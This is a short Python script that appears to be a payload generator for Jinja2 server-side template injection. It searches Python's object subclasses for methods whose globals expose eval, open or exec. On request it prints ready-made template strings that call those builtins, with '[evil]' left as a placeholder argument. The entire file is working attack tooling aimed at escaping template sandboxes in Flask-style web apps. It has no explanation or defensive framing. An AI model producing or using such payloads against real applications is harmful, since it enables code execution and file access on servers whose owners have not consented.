#!/usr/bin/python3

from flask import Flask
from jinja2 import Template

searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    for attr in searchList:
        if hasattr(i, attr):
            if eval('str(i.'+attr+')[1:9]') == 'function':
                for goal in neededFunction:
                    if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                        if pay != 1:
                            print(i.__name__,":", attr, goal)
                        else:
                            print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")